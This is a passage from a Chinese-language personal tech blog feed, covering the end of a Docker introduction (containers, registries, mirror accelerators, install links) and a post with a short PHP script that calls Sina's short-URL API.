&lt;h3 id=&quot;org944ecbb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 容器&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;p&gt;
容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。
每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1b10101&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1b10101&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 仓库&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. Docker Registry
&lt;/pre&gt;

&lt;p&gt;
&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/repository/registry.html&quot;&gt;Docker Registry&lt;/a&gt; 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
2. Docker Registry 公开服务
&lt;/pre&gt;

&lt;p&gt;
开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。
最常使用的 Registry 公开服务
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;官方的 &lt;a href=&quot;https://hub.docker.com/&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://coreos.com/&quot;&gt;CoreOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quay.io/repository/&quot;&gt;Quay.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;时速云镜像仓库&lt;/li&gt;
&lt;li&gt;网易云镜像服务&lt;/li&gt;
&lt;li&gt;DaoCloud 镜像市场&lt;/li&gt;
&lt;li&gt;阿里云镜像库&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
由于某些原因，在国内访问这些服务可能会比较慢。国内的一些云服务商提供了针对 Docker Hub 的镜像服务（Registry Mirror），这些镜像服务被称为加速器。常见的有：
&lt;/pre&gt;

&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://cr.console.aliyun.com/#/accelerator&quot;&gt;阿里云加速器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.daocloud.io/mirror#accelerator-doc&quot;&gt;DaoCloud 加速器&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org083eb0f&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org083eb0f&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; &lt;/h4&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6dc74a6&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6dc74a6&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 安装 Docker&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Ubuntu：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Debian：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/debian.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/debian.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;CentOS：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/centos.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/centos.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Raspberry Pi：&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/install/raspberry-pi.html&quot;&gt;https://yeasy.gitbooks.io/docker_practice/content/install/raspberry-pi.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb270f4e&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgb270f4e&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://yeasy.gitbooks.io/docker_practice/content/&quot;&gt;Docker — 从入门到实践&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="docker" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">PHP 调用新浪API生成短链接</title><link href="http://localhost:4000/php/2018/09/19/php-sina-short-url/" rel="alternate" type="text/html" title="PHP 调用新浪API生成短链接" /><published>2018-09-19T00:00:00+08:00</published><updated>2018-09-19T00:00:00+08:00</updated><id>http://localhost:4000/php/2018/09/19/php-sina-short-url</id><content type="html" xml:base="http://localhost:4000/php/2018/09/19/php-sina-short-url/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-orgae84cd1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgae84cd1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; API&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;http://api.t.sina.com.cn/short_url/shorten.json&quot;&gt;http://api.t.sina.com.cn/short_url/shorten.json&lt;/a&gt; (返回结果是JSON格式)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://api.t.sina.com.cn/short_url/shorten.xml&quot;&gt;http://api.t.sina.com.cn/short_url/shorten.xml&lt;/a&gt; （返回结果是XML格式）&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5c10b7c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5c10b7c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 请求参数&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;source 申请应用时分配的AppKey，调用接口时代表应用的唯一身份。&lt;/li&gt;
&lt;li&gt;url_long 需要转换的长链接，需要URLencoded，最多不超过20个。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org474d9fb&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org474d9fb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 创建source方法&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;进入&lt;a href=&quot;http://open.weibo.com/&quot;&gt;http://open.weibo.com/&lt;/a&gt; ，选择菜单 微连接-&amp;gt;网站接入。&lt;/li&gt;
&lt;li&gt;点击立即接入，创建新应用，随便填写应用名称，点击创建。&lt;/li&gt;
&lt;li&gt;创建成功后，AppKey就是source参数的值，可以用于请求创建短链接。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf862ba0&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf862ba0&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 测试代码&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;测试代码&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;&amp;lt;?php
$api = 'http://api.t.sina.com.cn/short_url/shorten.json'&lt;span style=&quot;color: #727072;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;// json&lt;/span&gt;
// $api = 'http://api.t.sina.com.cn/short_url/shorten.xml'&lt;span style=&quot;color: #727072;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;// xml&lt;/span&gt;

$source = '&amp;#24744;&amp;#30003;&amp;#35831;&amp;#30340;AppKey'&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
$url_long = 'http://blog.csdn.net/fdipzone'&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;

$request_url = sprintf($api.'?source=%s&amp;amp;url_long=%s', $source, $url_long)&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;

$data = file_get_contents($request_url)&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
echo $data&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org89adfa3&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org89adfa3&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/fdipzone/article/details/70832761&quot;&gt;php 调用新浪API生成短链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="PHP-新浪-短链接" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry></feed>